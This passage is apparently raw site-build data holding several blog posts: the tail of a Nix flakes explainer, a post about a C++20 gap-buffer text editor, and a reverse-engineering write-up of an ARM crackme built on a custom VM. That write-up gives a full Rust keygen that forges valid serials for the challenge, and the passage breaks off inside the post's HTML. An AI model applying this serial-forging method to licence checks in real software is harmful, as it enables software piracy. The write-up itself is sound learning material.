package.\u003C/p>\n\u003C/li>\n\u003Cli>\n\u003Cp>nix run: one-off running of programs.\u003C/p>\n\u003C/li>\n\u003Cli>\n\u003Cp>nix build: ensure a derivation is available in your /nix/store. Either download or build. Optionally: create symlink in ./result, and/or print the output path to stdout, and/or print build noise to stderr (\u003Ccode>--print-build-logs\u003C/code>).\u003C/p>\n\u003C/li>\n\u003C/ul>\n\u003Cp>Coming back to the project we can see that muhehe\r\n\u003Cimg src=\"/images/posts/nixos-flakes/12.png\" alt=\"\">\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/nixos-flakes/13.png\" alt=\"\">\r\nLet’s break down what the nix approach using flakes solves here , ill adress the main things in packaging\u003C/p>\n\u003Ch3 id=\"1-reproducibility\">1. Reproducibility\u003C/h3>\n\u003Cp>Normally, if you just run \u003Ccode>cargo build\u003C/code>, your binary depends on several local factors: the version of Rust installed on your machine, the versions of system libraries like \u003Ccode>libssl\u003C/code> or \u003Ccode>libsqlite\u003C/code>, and the state of your local \u003Ccode>Cargo.lock\u003C/code>. With Nix, the build becomes fully reproducible. It uses a specific Rust toolchain (nightly in our example), relies on vendored dependencies in the \u003Ccode>vendor/\u003C/code> directory, and incorporates all libraries declared in the \u003Ccode>flake.nix\u003C/code> dev shell. The result is that anyone on any machine with Nix installed can build the exact same binary, eliminating the common “works on my machine” problems.\u003C/p>\n\u003Ch3 id=\"2-isolation\">2. Isolation\u003C/h3>\n\u003Cp>Nix builds everything inside a sandbox located in \u003Ccode>/nix/store\u003C/code>, which prevents accidental dependencies on files outside the project or on system-installed libraries or Rust versions. This isolation ensures that builds are deterministic and safe, making it ideal for continuous integration and deployment pipelines.\u003C/p>\n\u003Ch3 id=\"3-cross-compilation\">3. Cross-compilation\u003C/h3>\n\u003Cp>Building for multiple targets such as Linux, ARM, or Windows normally requires installing Rust targets manually and configuring toolchains and linker flags. With Nix, you can declare all your targets in \u003Ccode>flake.nix\u003C/code> for example, \u003Ccode>x86_64-unknown-linux-musl\u003C/code>, \u003Ccode>aarch64-unknown-linux-gnu\u003C/code>, and \u003Ccode>x86_64-pc-windows-gnu\u003C/code>. Nix automatically sets up all the required compilers and Rust standard libraries for these targets, making cross-compilation seamless.\u003C/p>\n\u003Ch3 id=\"4-automation-and-declarative-builds\">4. Automation and Declarative Builds\u003C/h3>\n\u003Cp>Using Nix eliminates the need for manual scripts like \u003Ccode>build-all.sh\u003C/code>. Everything is declarative in \u003Ccode>flake.nix\u003C/code>: the dev environment is set up automatically with \u003Ccode>nix develop\u003C/code>, binary builds happen with \u003Ccode>nix build .#default\u003C/code>, and cross-compilation targets are handled automatically. This declarative approach makes your Rust project fully CI/CD-ready with zero surprises.\u003C/p>\n\u003Ch3 id=\"wrapping-it-up\">Wrapping it up\u003C/h3>\n\u003Ch3 id=\"a-language-for-builders\">A Language for Builders\u003C/h3>\n\u003Cp>We need to find a better way to write builders. \u003Cstrong>Shell scripts\u003C/strong> are simply not a good language for this purpose. The \u003Cstrong>Unix shell\u003C/strong> is quite good as component glue which is what we use it for but it is not \u003Cstrong>safe enough\u003C/strong>. It is, in fact, virtually impossible to write \u003Cem>“correct”\u003C/em> shell scripts that do not fail unexpectedly for banal reasons on certain inputs or in certain situations.\u003C/p>\n\u003Ch4 id=\"problems-with-shell-scripts\">Problems with Shell Scripts\u003C/h4>\n\u003Cp>Here are some of the main problems in the language:\u003C/p>\n\u003Cul>\n\u003Cli>\n\u003Cp>\u003Cstrong>Variable interpolation\u003C/strong> (e.g., \u003Ccode>$foo\u003C/code>) happens by default.\u003Cbr>\nThis causes most shell scripts to fail on file names that contain spaces or newlines.\u003Cbr>\nThe same applies to automatic \u003Cem>globbing\u003C/em> (expansion of special characters such as \u003Ccode>*\u003C/code>).\u003C/p>\n\u003C/li>\n\u003Cli>\n\u003Cp>\u003Cstrong>Undefined variables\u003C/strong> do not signal an error.\u003C/p>\n\u003C/li>\n\u003Cli>\n\u003Cp>\u003Cstrong>Non-zero exit codes\u003C/strong> from commands are ignored by default.\u003Cbr>\nWorse, it is extremely hard to catch errors from the left-hand sides of pipes.\u003C/p>\n\u003C/li>\n\u003C/ul>\n\u003Chr>\n\u003Cp>In fact, the whole \u003Cstrong>Unix toolchain\u003C/strong> is not conducive to writing correct code:\u003C/p>\n\u003Cul>\n\u003Cli>\n\u003Cp>\u003Cstrong>Command-line arguments\u003C/strong> in Unix are usually overloaded.\u003Cbr>\nFor example, there is an ambiguity in most Unix tools between options and file names starting with a dash.\u003C/p>\n\u003C/li>\n\u003Cli>\n\u003Cp>The \u003Cstrong>pipe model\u003C/strong> assumes that all tools read and write \u003Cem>flat text files\u003C/em> without a well-defined structure.\u003Cbr>\nThis makes it hard to extract relevant data in a structured way. Typically, regular expressions in conjunction with tools like \u003Ccode>grep\u003C/code>, \u003Ccode>sed\u003C/code>, \u003Ccode>awk\u003C/code>, and \u003Ccode>perl\u003C/code> are used to extract data but this tends to be brittle. The regular expressions hardly ever cover all possibilities.\u003C/p>\n\u003C/li>\n\u003Cli>\n\u003Cp>Similarly, the fact that \u003Cstrong>options are flat strings\u003C/strong> makes it hard to pass structure, necessitating escaping.\u003Cbr>\nFor instance, the command \u003Ccode>grep -q \"$filename\"\u003C/code> to see whether a certain file name occurs in a list fails to account for the fact that \u003Ccode>grep\u003C/code> interprets some characters in \u003Ccode>$filename\u003C/code> as \u003Cstrong>regular expression meta-characters\u003C/strong>.\u003C/p>\n\u003C/li>\n\u003C/ul>\n\u003Chr>\n\u003Ch3 id=\"the-problem-of-eliminating-bad-components-in-a-purely-functional-model\">The Problem of Eliminating “Bad” Components in a Purely Functional Model\u003C/h3>\n\u003Cp>While the \u003Cstrong>purely functional model\u003C/strong> used by Nix offers strong guarantees of reproducibility and non-interference, it introduces a unique challenge:\u003Cbr>\nHow can we ensure that all uses of a certain \u003Cstrong>“bad” component\u003C/strong> such as one containing a security vulnerability have been fully eliminated?\u003C/p>\n\u003Cp>Consider a scenario where a \u003Cstrong>fundamental dependency\u003C/strong>, such as \u003Cstrong>Zlib\u003C/strong>, is discovered to contain a critical security flaw.\u003Cbr>\nBecause Zlib is widely used by many other components and applications, we must guarantee that \u003Cstrong>every package\u003C/strong> depending on the vulnerable version is replaced with one built against a \u003Cstrong>patched version\u003C/strong>.\u003C/p>\n\u003Cp>In principle, we might attempt to update everything using a command like:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">nix-env\u003C/span>\u003Cspan style=\"color:#79B8FF\"> -u\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"*\"\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>However, this approach is \u003Cstrong>not guaranteed\u003C/strong> to remove all vulnerable components especially if some were installed from \u003Cstrong>arbitrary third-party sources\u003C/strong> outside of \u003Cstrong>Nixpkgs\u003C/strong>.\u003C/p>\n\u003Cp>This limitation arises from the very \u003Cstrong>non-interference property\u003C/strong> that makes Nix functional and reproducible: each component is built in isolation, without being globally overwritten or modified in place. While this ensures determinism, it also means that \u003Cstrong>outdated or insecure builds can persist\u003C/strong> if not explicitly replaced.\u003C/p>\n\u003Chr>\n\u003Ch3 id=\"toward-a-solution\">Toward a Solution\u003C/h3>\n\u003Cp>To address this, the system needs a \u003Cstrong>generic detection mechanism\u003C/strong> that can identify the presence or usage of “bad” components.\u003Cbr>\nSuch a mechanism would rely on a \u003Cstrong>blacklist\u003C/strong> describing known-vulnerable packages or derivations. The build system could then trace dependency graphs and flag (or prevent) any components that still depend on blacklisted items.\u003C/p>\n\u003Cp>This approach ensures that security updates are \u003Cstrong>systematic and verifiable\u003C/strong>, preserving the advantages of the functional model while adding \u003Cstrong>safety guarantees\u003C/strong> against vulnerable dependencies.\u003C/p>\n\u003Cp>In essence, while Nix’s functional model prevents uncontrolled interference, it also prevents automatic global replacement of insecure components. The solution lies in \u003Cstrong>explicit detection and tracing mechanisms\u003C/strong>, guided by a \u003Cstrong>blacklist\u003C/strong>, that can systematically ensure the removal and replacement of all affected packages combining \u003Cstrong>deterministic builds\u003C/strong> with \u003Cstrong>reliable security assurance\u003C/strong>.\u003C/p>\n\u003Ch3 id=\"some-honest-thoughts\">Some honest thoughts\u003C/h3>\n\u003Cp>Contrary to popular believe, you don’t need to learn the nix language to use nix. From your perspective, nix can be glorified json for configuring your system. There is much more to the programming language that you probably won’t ever have to care about.\u003C/p>\n\u003Cp>I don’t think NixOS is intrinsically more work or more complicated than Debian. It can be if you are coming from a traditional distro or if your specific use case is not supported well. E. g. setting up a web server, a firewall or other system components is much easier in NixOS. Getting some random python package working however can be a big pain. If you use popular software you should be good.\u003C/p>\n\u003Cp>I’d argue using NixOS is more involved at the beginning but gets much less involved after you set things up as generally things don’t break. Once in a while you get a deprecation message and may need to adjust your configuration - that’s it.\u003C/p>\n\u003Cp>I find myself however stumbling upon better ways of configuring my system and steadily improving my set up. I believe I wouldn’t be doing that on a traditional distro so much because it would be much harder to do these things while keeping state. So if you are a perfectionist or an enthusiast you will probably spend more time just because it’s much more fun :3\u003C/p>",{"headings":378,"localImagePaths":432,"remoteImagePaths":433,"frontmatter":434,"imagePaths":436},[379,381,384,387,390,393,396,399,402,405,408,411,414,417,420,423,426,429],{"depth":24,"slug":380,"text":370},"provenance-and-purity-nix-programming-language--fixed-output-flakes",{"depth":27,"slug":382,"text":383},"laziness-jit-compilation","Laziness (JIT compilation)",{"depth":27,"slug":385,"text":386},"nix-flakes-","NIX FLAKES : )",{"depth":27,"slug":388,"text":389},"so-what-the-fuck-are-flakes-now","So what the fuck are flakes now ?",{"depth":27,"slug":391,"text":392},"should-i-use-flakes-in-my-project","Should I use flakes in my project?",{"depth":27,"slug":394,"text":395},"flakenix-defaultnix-shellnix-in-project-directories","flake.nix (default.nix, shell.nix) in project directories",{"depth":40,"slug":397,"text":398},"why-use-nix-flakes-for-any-projects","Why Use Nix Flakes for ANY Projects?",{"depth":40,"slug":400,"text":401},"building-the-project","Building the Project",{"depth":40,"slug":403,"text":404},"1-reproducibility","1. Reproducibility",{"depth":40,"slug":406,"text":407},"2-isolation","2. Isolation",{"depth":40,"slug":409,"text":410},"3-cross-compilation","3. Cross-compilation",{"depth":40,"slug":412,"text":413},"4-automation-and-declarative-builds","4. Automation and Declarative Builds",{"depth":40,"slug":415,"text":416},"wrapping-it-up","Wrapping it up",{"depth":40,"slug":418,"text":419},"a-language-for-builders","A Language for Builders",{"depth":260,"slug":421,"text":422},"problems-with-shell-scripts","Problems with Shell Scripts",{"depth":40,"slug":424,"text":425},"the-problem-of-eliminating-bad-components-in-a-purely-functional-model","The Problem of Eliminating “Bad” Components in a Purely Functional Model",{"depth":40,"slug":427,"text":428},"toward-a-solution","Toward a Solution",{"depth":40,"slug":430,"text":431},"some-honest-thoughts","Some honest thoughts",[],[],{"title":370,"date":435},"2025-10-02",[],"honeymoon",{"id":437,"data":439,"body":443,"filePath":444,"digest":445,"rendered":446},{"title":440,"date":441,"excerpt":442},"I Use a Gap Buffer, Bitch.",["Date","2026-01-26T00:00:00.000Z"],"Fast as fuck terminal editing in C++20.","I got tired of waiting for my editor to load, and I got tired of remembering which mode I was in. So I wrote my own.\r\n\r\n**FUCK VIM.**\r\n\r\nAnd Honeymoon doesn’t run a Lisp interpreter that eats 4GB of RAM on startup. It is a minimal, Emacs-inspired terminal text editor written in **C++20**.\r\n\r\nIt is fast.\r\n\r\n## Features\r\n\r\n* **Visual Mode**\r\n  `Ctrl-Space` to mark. Move. `Ctrl-W` to cut.\r\n  Just like Emacs, but without the pinky pain.\r\n  (Okay, maybe some pinky pain.)\r\n\r\n## Architecture\r\n\r\nThe code is split into three namespaces:\r\n\r\n* `honeymoon::kernel`\r\n  Core editor logic.\r\n\r\n* `honeymoon::driver`\r\n   Raw mode, TTY I/O, screen rendering.\r\n\r\n* `honeymoon::mem`\r\n  A templated gap buffer implementation.\r\n\r\n### The Gap Buffer\r\nInstead of a simple string or a rope (which can be complex), Honeymoon uses a **Gap Buffer**. This is a dynamic array with a \"gap\" (a sequence of unused entries) that moves with the cursor. This makes insertions and deletions at the cursor position extremely efficient—O(1) in most cases—without the overhead of shifting the entire document.\r\n\r\n```cpp\r\n// Simplified concept\r\n['H', 'e', 'l', 'l', 'o', _, _, _, _, 'W', 'o', 'r', 'l', 'd']\r\n                          ^ Gap starts here\r\n```\r\n\r\n## Build\r\n\r\nYou need a C++20 compiler and `make`.\r\n\r\n* Linux: you’re fine.\r\n* Windows: WSL or sm.\r\n\r\n```bash\r\nmake\r\n./honeymoon filename.txt\r\n```\r\n\r\n## Controls\r\n\r\nIf you know Vim, I’m sorry.\r\n\r\n\u003Cp align=\"center\">\r\n  \u003Cimg src=\"/images/posts/honeymoon/honeymoon-blog.gif\" alt=\"gif\">\r\n\u003C/p>\r\n\r\n## Internals\r\n\r\nFor a deeper dive into the technical details (ANSI, custom drivers, etc.), check out the full internals documentation:\r\n[mooofin.github.io/honeymoon/index.html](https://mooofin.github.io/honeymoon/index.html)","src/content/blog/honeymoon.md","17987d88722eaaba",{"html":447,"metadata":448},"\u003Cp>I got tired of waiting for my editor to load, and I got tired of remembering which mode I was in. So I wrote my own.\u003C/p>\n\u003Cp>\u003Cstrong>FUCK VIM.\u003C/strong>\u003C/p>\n\u003Cp>And Honeymoon doesn’t run a Lisp interpreter that eats 4GB of RAM on startup. It is a minimal, Emacs-inspired terminal text editor written in \u003Cstrong>C++20\u003C/strong>.\u003C/p>\n\u003Cp>It is fast.\u003C/p>\n\u003Ch2 id=\"features\">Features\u003C/h2>\n\u003Cul>\n\u003Cli>\u003Cstrong>Visual Mode\u003C/strong>\r\n\u003Ccode>Ctrl-Space\u003C/code> to mark. Move. \u003Ccode>Ctrl-W\u003C/code> to cut.\r\nJust like Emacs, but without the pinky pain.\r\n(Okay, maybe some pinky pain.)\u003C/li>\n\u003C/ul>\n\u003Ch2 id=\"architecture\">Architecture\u003C/h2>\n\u003Cp>The code is split into three namespaces:\u003C/p>\n\u003Cul>\n\u003Cli>\n\u003Cp>\u003Ccode>honeymoon::kernel\u003C/code>\r\nCore editor logic.\u003C/p>\n\u003C/li>\n\u003Cli>\n\u003Cp>\u003Ccode>honeymoon::driver\u003C/code>\r\nRaw mode, TTY I/O, screen rendering.\u003C/p>\n\u003C/li>\n\u003Cli>\n\u003Cp>\u003Ccode>honeymoon::mem\u003C/code>\r\nA templated gap buffer implementation.\u003C/p>\n\u003C/li>\n\u003C/ul>\n\u003Ch3 id=\"the-gap-buffer\">The Gap Buffer\u003C/h3>\n\u003Cp>Instead of a simple string or a rope (which can be complex), Honeymoon uses a \u003Cstrong>Gap Buffer\u003C/strong>. This is a dynamic array with a “gap” (a sequence of unused entries) that moves with the cursor. This makes insertions and deletions at the cursor position extremely efficient—O(1) in most cases—without the overhead of shifting the entire document.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"cpp\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">// Simplified concept\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">[\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'H'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#9ECBFF\">'e'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#9ECBFF\">'l'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#9ECBFF\">'l'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#9ECBFF\">'o'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#FFAB70\">_\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#FFAB70\">_\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#FFAB70\">_\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#FFAB70\">_\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#9ECBFF\">'W'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#9ECBFF\">'o'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#9ECBFF\">'r'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#9ECBFF\">'l'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#9ECBFF\">'d'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                          ^ Gap starts here\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Ch2 id=\"build\">Build\u003C/h2>\n\u003Cp>You need a C++20 compiler and \u003Ccode>make\u003C/code>.\u003C/p>\n\u003Cul>\n\u003Cli>Linux: you’re fine.\u003C/li>\n\u003Cli>Windows: WSL or sm.\u003C/li>\n\u003C/ul>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">make\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">./honeymoon\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> filename.txt\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Ch2 id=\"controls\">Controls\u003C/h2>\n\u003Cp>If you know Vim, I’m sorry.\u003C/p>\n\u003Cp align=\"center\">\n  \u003Cimg src=\"/images/posts/honeymoon/honeymoon-blog.gif\" alt=\"gif\">\n\u003C/p>\n\u003Ch2 id=\"internals\">Internals\u003C/h2>\n\u003Cp>For a deeper dive into the technical details (ANSI, custom drivers, etc.), check out the full internals documentation:\r\n\u003Ca href=\"https://mooofin.github.io/honeymoon/index.html\">mooofin.github.io/honeymoon/index.html\u003C/a>\u003C/p>",{"headings":449,"localImagePaths":468,"remoteImagePaths":469,"frontmatter":470,"imagePaths":472},[450,453,456,459,462,465],{"depth":27,"slug":451,"text":452},"features","Features",{"depth":27,"slug":454,"text":455},"architecture","Architecture",{"depth":40,"slug":457,"text":458},"the-gap-buffer","The Gap Buffer",{"depth":27,"slug":460,"text":461},"build","Build",{"depth":27,"slug":463,"text":464},"controls","Controls",{"depth":27,"slug":466,"text":467},"internals","Internals",[],[],{"title":440,"date":471,"excerpt":442},"2026-01-26",[],"tea-and-psychological-damage",{"id":473,"data":475,"body":478,"filePath":479,"digest":480,"rendered":481},{"title":476,"date":477},"32 Rounds of TEA and Psychological Damage, Surviving a Stripped 32-bit Binary",["Date","2025-12-29T00:00:00.000Z"],"![Binary Analysis](/images/posts/tea-and-psychological-damage/vm2-1.png)\r\n\r\nThis program is a 32-bit ARM binary. This means it is meant to run on ARM systems and not on regular x86 machines, so it cannot be run directly. The binary is also stripped, meaning there are no useful function names, and it is dynamically linked. Even though it cannot be executed easily, running it is not required. Static analysis is enough to understand the logic and solve the challenge.\r\n\r\n## Initial Analysis\r\n\r\n![Program Output](/images/posts/tea-and-psychological-damage/vm2-2.png)\r\n\r\nWhen the program starts, it prints a message and waits for user input. The input is read using the `read()` function. Instead of keeping the input as raw text, the program parses it into numbers and stores them contiguously in a heap-allocated buffer. These parsed values are later treated as fake registers for a custom virtual machine implemented by the binary.\r\n\r\n![Input Parsing](/images/posts/tea-and-psychological-damage/vm2-3.png)\r\n\r\n## The Virtual Machine\r\n\r\nAfter parsing the input, execution jumps into a function named `fcn.00008410`. This function works as the main VM interpreter. From this point onward, the program is no longer executing normal ARM instructions. Instead, it starts reading and executing VM bytecode stored as data inside the binary.\r\n\r\nEach VM instruction is 4 bytes long. The first byte is the opcode, which decides what operation to perform. The remaining three bytes are arguments. The opcode is used as an index into a jump table, which then jumps to the corresponding instruction handler.\r\n\r\nThe VM maintains its own execution state similar to a real CPU. It has its own registers, its own stack, and its own instruction pointer. Register index 30 is used as the stack pointer, while register index 31 stores the current VM instruction pointer.\r\n\r\n## Reverse Engineering the Instruction Set\r\n\r\nBy analyzing where the jump table leads and observing what each handler does, the VM instruction set can be identified. As the purpose of each handler becomes clear, they are renamed in radare2 to match their behavior. For example, one instruction was identified as a load lower immediate and renamed `LLi`.\r\n\r\n### Load Lower Immediate (LLi)\r\n\r\n![Load Lower Immediate](/images/posts/tea-and-psychological-damage/vm2-4.png)\r\n\r\nThis instruction loads an immediate value into the lower portion of a register.\r\n\r\n### Load Upper Immediate (LUi)\r\n\r\n![Load Upper Immediate](/images/posts/tea-and-psychological-damage/vm2-5.png)\r\n\r\nAnother similar instruction was identified as Load Upper Immediate, which loads an immediate value into the upper portion of a register.\r\n\r\n### Addition (vm_add)\r\n\r\n![Addition Operation](/images/posts/tea-and-psychological-damage/vm2-6.png)\r\n\r\nThe next instruction handled addition between values.\r\n\r\n### Conditional Jump\r\n\r\nThe next instruction was particularly complex. It combines two bytes into a 16-bit value and then performs conditional logic based on comparisons. It checks whether a condition is met and updates the VM instruction pointer accordingly. Based on its behavior, this instruction appears to act like a conditional jump.\r\n\r\n### Compare Instruction\r\n\r\n![Compare Instruction](/images/posts/tea-and-psychological-damage/vm2-7.png)\r\n\r\nAfter that, another instruction was identified which performs comparisons between values.\r\n\r\n### Stack Operations\r\n\r\n![Push Operation](/images/posts/tea-and-psychological-damage/vm2-8.png)\r\n\r\nTwo instructions handle stack management:\r\n- **Push**: Pushes values onto the VM stack\r\n\r\n![Pop Operation](/images/posts/tea-and-psychological-damage/vm2-9.png)\r\n\r\n- **Pop**: Pops values from the VM stack\r\n\r\n### Subtraction (vm_sub)\r\n\r\n![Subtraction Operation](/images/posts/tea-and-psychological-damage/vm2-10.png)\r\n\r\nAnother instruction performs subtraction between values.\r\n\r\n### Bit Shifting\r\n\r\n![Bit Shifting](/images/posts/tea-and-psychological-damage/vm2-11.png)\r\n\r\nThis instruction was more math-heavy and performs bit shifting operations before producing a result.\r\n\r\n### XOR Operation\r\n\r\n![XOR Operation](/images/posts/tea-and-psychological-damage/vm2-12.png)\r\n\r\nThe next instruction performs an XOR operation.\r\n\r\n### NOP\r\n\r\n![NOP Instruction](/images/posts/tea-and-psychological-damage/vm2-13.png)\r\n\r\nFinally, this instruction does nothing and serves as a NOP.\r\n\r\n## The Opcode Table\r\n\r\nAfter finally renaming all the VM instructions in radare2, I ended up with a clear structure of how the virtual machine works internally.\r\n\r\n![VM Structure](/images/posts/tea-and-psychological-damage/vm2-14.png)\r\n\r\nI also identified the main VM dispatcher, which is responsible for fetching each instruction, decoding the opcode, and jumping to the correct handler.\r\n\r\n![VM Dispatcher](/images/posts/tea-and-psychological-damage/vm2-15.png)\r\n\r\nSince the opcode handlers were already renamed and understood, I mapped out the full opcode table.\r\n\r\n![Opcode Table](/images/posts/tea-and-psychological-damage/vm2-16.png)\r\n\r\nWith this information, the extracted VM bytecode could now be mapped properly, because we know what each register represents and what each instruction does.\r\n\r\n![Bytecode Dump](/images/posts/tea-and-psychological-damage/vm2-17.png)\r\n\r\n![Keygen](/images/posts/tea-and-psychological-damage/vm2-20.png)\r\n\r\n## Discovering TEA Encryption\r\n\r\nAt this point, the next goal was figuring out how to convert this raw bytecode dump into readable pseudocode.\r\n\r\nWhen the VM starts running, it first loads two constant values. One of them is `0x9e3779b9`, which is a well-known constant used in the TEA (Tiny Encryption Algorithm) encryption algorithm. This immediately hints that some kind of encryption or mixing logic is involved.\r\n\r\n![TEA Constant](/images/posts/tea-and-psychological-damage/vm2-18.png)\r\n\r\n## The Algorithm\r\n\r\nInstead of explaining everything line by line, the image below gives a clean high-level view of what the VM is actually doing.\r\n\r\n![Algorithm Overview](/images/posts/tea-and-psychological-damage/vm2-19.png)\r\n\r\nIn short, the program takes your input key and scrambles it using a small encryption-like routine that runs for 32 rounds. After all rounds are done, the final result is compared against two hardcoded secret values. If the values match, the key is accepted.\r\n\r\n## Keygen Solution\r\n\r\nTo solve this, I wrote a keygen in Rust that reverses the TEA encryption process:\r\n\r\n```rust\r\nuse rand::Rng;\r\n\r\nfn combine(seed: u32, a: u32, b: u32, c: u32) -> u32 {\r\n    let r9  = a.wrapping_shr(5).wrapping_add(b);\r\n    let r10 = a.wrapping_add(seed);\r\n    let r11 = a.wrapping_shl(4).wrapping_add(c);\r\n    r11 ^ r10 ^ r9\r\n}\r\n\r\nfn validate(mut serial: [u32; 6]) -> bool {\r\n    let mut r6 = 0xc6ef_3720u32;\r\n    let r7 = 0x9e37_79b9u32;\r\n\r\n    for _ in 0..32 {\r\n        let r12 = combine(r6, serial[0], serial[5], serial[4]);\r\n        serial[1] = serial[1].wrapping_sub(r12);\r\n\r\n        let r12 = combine(r6, serial[1], serial[3], serial[2]);\r\n        serial[0] = serial[0].wrapping_sub(r12);\r\n\r\n        r6 = r6.wrapping_sub(r7);\r\n    }\r\n\r\n    serial[0] == 0xba01_aafe && serial[1] == 0xbbff_31a3\r\n}\r\n\r\nfn keygen() -> [u32; 6] {\r\n    let mut serial = [0u32; 6];\r\n\r\n    serial[0] = 0xba01_aafe;\r\n    serial[1] = 0xbbff_31a3;\r\n\r\n    let mut rng = rand::thread_rng();\r\n    serial[2] = rng.gen::\u003Cu32>();\r\n    serial[3] = rng.gen::\u003Cu32>();\r\n    serial[4] = rng.gen::\u003Cu32>();\r\n    serial[5] = rng.gen::\u003Cu32>();\r\n\r\n    let mut r6 = 0x9e37_79b9u32;\r\n\r\n    for _ in 0..32 {\r\n        let r12 = combine(r6, serial[1], serial[3], serial[2]);\r\n        serial[0] = serial[0].wrapping_add(r12);\r\n\r\n        let r12 = combine(r6, serial[0], serial[5], serial[4]);\r\n        serial[1] = serial[1].wrapping_add(r12);\r\n\r\n        r6 = r6.wrapping_add(0x9e37_79b9);\r\n    }\r\n\r\n    serial\r\n}\r\n\r\nfn main() {\r\n    for _ in 0..100 {\r\n        let s = keygen();\r\n        assert!(validate(s));\r\n        println!(\r\n            \"{:08x},{:08x},{:08x},{:08x},{:08x},{:08x}\",\r\n            s[0], s[1], s[2], s[3], s[4], s[5]\r\n        );\r\n    }\r\n}\r\n```\r\n\r\nThe keygen generates valid serials by:\r\n1. Starting with the target values (`0xba01aafe` and `0xbbff31a3`)\r\n2. Generating random values for the other four registers\r\n3. Running the TEA algorithm forward for 32 rounds\r\n![Output](/images/posts/tea-and-psychological-damage/vm2-21.png)\r\n\r\n4. The resulting values become valid input keys\r\n\r\nThis challenge was a great exercise in reverse engineering a custom virtual machine and understanding classic encryption algorithms!","src/content/blog/tea-and-psychological-damage.md","58c6b06e09fc1d6f",{"html":482,"metadata":483},"\u003Cp>\u003Cimg src=\"/images/posts/tea-and-psychological-damage/vm2-1.png\" alt=\"Binary Analysis\">\u003C/p>\n\u003Cp>This program is a 32-bit ARM binary. This means it is meant to run on ARM systems and not on regular x86 machines, so it cannot be run directly. The binary is also stripped, meaning there are no useful function names, and it is dynamically linked. Even though it cannot be executed easily, running it is not required. Static analysis is enough to understand the logic and solve the challenge.\u003C/p>\n\u003Ch2 id=\"initial-analysis\">Initial Analysis\u003C/h2>\n\u003Cp>\u003Cimg src=\"/images/posts/tea-and-psychological-damage/vm2-2.png\" alt=\"Program Output\">\u003C/p>\n\u003Cp>When the program starts, it prints a message and waits for user input. The input is read using the \u003Ccode>read()\u003C/code> function. Instead of keeping the input as raw text, the program parses it into numbers and stores them contiguously in a heap-allocated buffer. These parsed values are later treated as fake registers for a custom virtual machine implemented by the binary.\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/tea-and-psychological-damage/vm2-3.png\" alt=\"Input Parsing\">\u003C/p>\n\u003Ch2 id=\"the-virtual-machine\">The Virtual Machine\u003C/h2>\n\u003Cp>After parsing the input, execution jumps into a function named \u003Ccode>fcn.00008410\u003C/code>. This function works as the main VM interpreter. From this point onward, the program is no longer executing normal ARM instructions. Instead, it starts reading and executing VM bytecode stored as data inside the binary.\u003C/p>\n\u003Cp>Each VM instruction is 4 bytes long. The first byte is the opcode, which decides what operation to perform. The remaining three bytes are arguments. The opcode is used as an index into a jump table, which then jumps to the corresponding instruction handler.\u003C/p>\n\u003Cp>The VM maintains its own execution state similar to a real CPU. It has its own registers, its own stack, and its own instruction pointer. Register index 30 is used as the stack pointer, while register index 31 stores the current VM instruction pointer.\u003C/p>\n\u003Ch2 id=\"reverse-engineering-the-instruction-set\">Reverse Engineering the Instruction Set\u003C/h2>\n\u003Cp>By analyzing where the jump table leads and observing what each handler does, the VM instruction set can be identified. As the purpose of each handler becomes clear, they are renamed in radare2 to match their behavior. For example, one instruction was identified as a load lower immediate and renamed \u003Ccode>LLi\u003C/code>.\u003C/p>\n\u003Ch3 id=\"load-lower-immediate-lli\">Load Lower Immediate (LLi)\u003C/h3>\n\u003Cp>\u003Cimg src=\"/images/posts/tea-and-psychological-damage/vm2-4.png\" alt=\"Load Lower Immediate\">\u003C/p>\n\u003Cp>This instruction loads an immediate value into the lower portion of a register.\u003C/p>\n\u003Ch3 id=\"load-upper-immediate-lui\">Load Upper Immediate (LUi)\u003C/h3>\n\u003Cp>\u003Cimg 